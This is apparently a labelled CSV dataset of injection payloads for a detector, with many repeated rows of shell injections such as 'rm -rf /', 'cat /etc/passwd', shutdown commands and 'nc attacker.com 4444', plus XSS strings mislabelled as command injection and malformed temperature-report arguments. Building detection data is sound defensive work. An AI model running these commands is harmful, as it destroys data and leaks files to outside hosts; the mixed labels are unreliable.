payload,label,attack_type
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, test | nc attacker.com 4444",malicious,cmdi
"echo, <script>alert('XSS')</script>",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"echo, name=$USER; id",malicious,cmdi
"echo, hi && shutdown now",malicious,cmdi
"echo, value > /tmp/leak",malicious,cmdi
"echo, ok `whoami` && id",malicious,cmdi
"echo, <img src=x onerror=alert(1)>",malicious,cmdi
"echo, hello; rm -rf /",malicious,cmdi
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, -1",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, -1",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, -1",malicious,temp_report_error
"start_temp_report, -1",malicious,temp_report_error
"start_temp_report, -1",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, -1",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, -1",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, -1",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, -1",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, -1",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, abc",malicious,temp_report_error
"start_temp_report, -3.2",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, 0",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, NaN",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, 1.5",malicious,temp_report_error
"start_temp_report, five",malicious,temp_report_error
